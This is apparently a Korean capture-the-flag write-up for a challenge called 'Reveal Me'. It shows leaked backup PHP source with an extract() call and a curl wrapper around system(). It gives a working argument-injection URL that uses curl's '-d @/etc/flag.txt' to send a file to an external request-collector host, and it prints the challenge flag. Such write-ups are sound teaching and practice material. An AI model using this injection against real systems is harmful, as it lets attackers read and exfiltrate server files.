# Reveal Me
```
Everything is in front of you.

http://34.72.61.239/

Note: Flag is located in etc directory.

Author : x3rz
```
front? frontend? 프론트엔드에 모든게 있다?

문제 사이트에 접속하면 로그인 사이트밖에 나오지 않는데, 정말 이것저것 시도해봤지만 어떻게 진행해야 할지 감이 잡히지 않았다. 그러다가 상수형이 `robots.txt`에 백업 파일 힌트가 있다고 알려주셔서 확인해보니 `/backup/index.php.bak`이 비허용 되어있음을 알 수 있었다. 이전에도 `robotst.txt`에 접근을 해봤었는데 서버가 느려서인지 오류가 났어서 한참을 돌아왔다.

## /backup/index.php.bak
```php
<?php
error_reporting(0);
session_start(); 

if (isset($_POST['submit'])) {
  $pass = "REDACTED";
    extract($_POST);
  if (!empty($password)) {
      if ($password === $pass) {
      $_SESSION['last_page'] = "REDACTED";
          header('Location: fetch_url.php');
     }
  else{
    die("You have entered wrong password\n Please contact Admin for your password.");
  }
  }
}
?>
```
코드를 대충 훑어보면 `passwrod`에 대한 조건이 만족하면 `last_page`를 설정하고, `fetch_url.php`로 넘어간다. 혹시나 하는 마음에 이 파일도 백업파일이 있나 확인해보니 접근 가능했다.

## /backup/fetch_url.php
```php
if (isset($_GET['url'])) {
  $url = $_GET['url'];
  if(preg_match('/-F|-T|index.php/i',$url)) die("Use of Flags are banned.\n Dont try to exploit.\n Your malicious intent will be recorded.");
  system(escapeshellcmd('curl -l '.$url)); 
}
```
이 페이지는 `url` 매개변수를 통해 `system` 함수를 사용할 수 있다. 기본적으로 `curl`을 이용할 수 있도록 해놓았다. 다른 명령 실행을 방지하고자 `escapeshellcmd`함수를 사용했고, `preg_match`를 통해 파일을 전송할 수 있는 옵션 값을 막아두었다.

## command injection
`/etc/flag.txt`를 명령을 통해 어떻게든 밖으로 빼내야 했기 때문에 파일을 포함한 request를 생성하는 것을 목적으로 했다.
```
http://34.72.61.239/fetch_url.php?url=-d+@/etc/flag.txt+"https://enbux3dy62rav.x.pipedream.net"
```
상수형의 아이디어로 `@/etc/flag.txt` 와 같은 형태로 파일을 불러들여 `-d` 옵션을 통해 플래그를 읽어낼 수 있었다. 

## flag
```
wormcon{3xtr4ct_4xtr4ct3d_my_fl4g_w14e14e}
```